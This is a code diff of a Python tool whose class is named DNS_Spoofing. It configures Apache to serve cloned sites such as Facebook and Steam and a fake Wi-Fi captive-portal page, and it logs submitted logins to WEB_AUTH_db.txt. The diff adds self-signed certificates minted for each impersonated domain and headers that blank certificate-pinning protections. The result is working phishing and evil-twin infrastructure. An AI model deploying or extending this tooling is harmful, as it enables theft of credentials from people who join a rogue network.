@@ -33,24 +33,32 @@ def Set_Log():
     with open(Curent_dir2+'/WEB_AUTH_db.txt','a') as DB_PASS :
         group1  = "chown "+ user_name+ ":"+user_name +" "+  Curent_dir2+"WEB_AUTH_db.txt" 
         os.system(group1)       
-      
+    os.system('sudo mkdir /var/www/html/wifi-notification')
+    shutil.copy(LOG_PATH+'/resources/index.html', '/var/www/html/wifi-notification/')
+    shutil.copy(LOG_PATH+'/resources/apple-success.html', '/var/www/html/wifi-notification/')
+    shutil.copy(LOG_PATH+'/resources/wifi-notification.conf', '/etc/apache2/sites-available/')
+    os.system("sudo touch /var/www/html/wifi-notification/generate_204")
+    os.system('sudo chown -R www-data:www-data /var/www/html/wifi-notification')
+    os.system('sudo chmod -R 755 /var/www/html/wifi-notification')  
 class DNS_Spoofing:
 
         def __init__(self):
             self.parse_args()
             self.unzip_web()
+            self.Certificate_Self()
             self.write_hosts()
             self.VirtualHost_files()       
             self.DNS_COPY_WEB()
         def DNS_COPY_WEB(self):
             try:
-                if os.path.exists("/var/www/html/steam"):
+                if os.path.exists("/var/www/html/facebook"):
                    for folder in os.listdir(LOG_PATH+"/sites"):
                         remove_sites = 'sudo rm -r /var/www/html/'+f'{folder}'
                         os.system(remove_sites)
                         shutil.copytree(Curent_dir2+'Snake_Package/sites/'+f'{folder}', '/var/www/html/'+f'{folder}')
                         enable = "sudo a2ensite  "+f'{folder}'+" > /dev/null 2>&1"
-                        os.system(enable)  
+                        os.system(enable) 
+                       
                 else:
                     for folder in os.listdir(LOG_PATH+"/sites"):
                         shutil.copytree(Curent_dir2+'Snake_Package/sites/'+f'{folder}', '/var/www/html/'+f'{folder}')
@@ -69,7 +77,8 @@ class DNS_Spoofing:
                          with open(LOG_PATH+'/resources/ports_dns.txt' ,'r') as portset :  
                              port = portset.read()
                          with open ("/etc/apache2/ports.conf" ,'w') as portset :  
-                              portset.write(port)   
+                              portset.write(port)  
+                              
                 os.system("sudo a2enmod ssl > /dev/null 2>&1")                     
                 os.system("sudo a2dissite 000-default.conf >/dev/null 2>&1")
                 os.system("sudo a2enmod rewrite >/dev/null 2>&1")
@@ -84,10 +93,30 @@ class DNS_Spoofing:
                     print("[+] Apache Configtest Get Error") 
                     print("[+] Run : journalctl -xeu apache2.service") 
                     exit()  
-
+                
             except FileExistsError as r  :
                 print("[+] error " ,r)
                 exit()
+        def Certificate_Self(self):      
+            ssl_dir = os.path.join(LOG_PATH, "SSLCertificateFile")
+            if os.path.exists(ssl_dir):
+                print("[+] SSL Certificate  Directory Found")
+            else:
+                
+                os.makedirs(ssl_dir, exist_ok=True)
+                print("[+] SSL Certificate File Directory Created")
+                for domain in os.listdir(os.path.join(LOG_PATH, "sites")):
+                    output_file = os.path.join(ssl_dir, f"{domain}.pem")
+                    openssl_cmd = [
+                        "openssl", "req", "-x509", "-newkey", "rsa:4096",
+                        "-sha256", "-days", "365", "-nodes",
+                        "-keyout", output_file,
+                        "-out", output_file,
+                        "-subj", f"/CN={domain}",
+                        "-addext", f"subjectAltName=DNS:{domain},DNS:*.{domain},IP:172.160.255.49"
+                    ]
+                    subprocess.run(openssl_cmd, check=True, capture_output=True)
+                print(f"[+] SSL Certificate Generated successfully.")
         def VirtualHost_files(self):
             if os.path.exists(LOG_PATH+'/VirtualHostFile'):
                 print("[+] VirtualHost File Found ")
@@ -152,8 +181,8 @@ class DNS_Spoofing:
 
                                     DocumentRoot /var/www/html/{file}
                                     SSLEngine on
-                                    SSLCertificateFile {LOG_PATH}/SSLCertificateFile/server-combined.pem
-                                    SSLCertificateKeyFile {LOG_PATH}/SSLCertificateFile/server-combined.pem
+                                    SSLCertificateFile {LOG_PATH}/SSLCertificateFile/{file}.pem
+                                    SSLCertificateKeyFile {LOG_PATH}/SSLCertificateFile/{file}.pem
                                     # Bypass security headers that might interfere with development
                                     Header always set Public-Key-Pins ""
                                     Header always set Expect-CT ""
@@ -192,8 +221,9 @@ class DNS_Spoofing:
                     copy_VirtualHost = os.system(file_copy)
                     print("[+] VirtualHost Files has been Created ")
                 except FileExistsError as r :
-                    print(r)
+                    print('[+] error',r)
                     exit()
+
         def write_hosts(self):
             if os.path.exists(LOG_PATH+'/resources/hosts.txt'):
                print("[+] Hosts dns Name List done ")
@@ -215,13 +245,7 @@ class DNS_Spoofing:
                     print("[+] Hosts dns resolve Name has be Created")
                  
         def unzip_web(self):
-            os.system('sudo mkdir /var/www/html/wifi-notification')
-            shutil.copy(LOG_PATH+'/resources/index.html', '/var/www/html/wifi-notification/')
-            shutil.copy(LOG_PATH+'/resources/apple-success.html', '/var/www/html/wifi-notification/')
-            shutil.copy(LOG_PATH+'/resources/wifi-notification.conf', '/etc/apache2/sites-available/')
-            os.system("sudo touch /var/www/html/wifi-notification/generate_204")
-            os.system('sudo chown -R www-data:www-data /var/www/html/wifi-notification')
-            os.system('sudo chmod -R 755 /var/www/html/wifi-notification')
+           
             if os.path.exists(Curent_dir2+'Snake_Package/sites'):
                Set_Log()
             else:
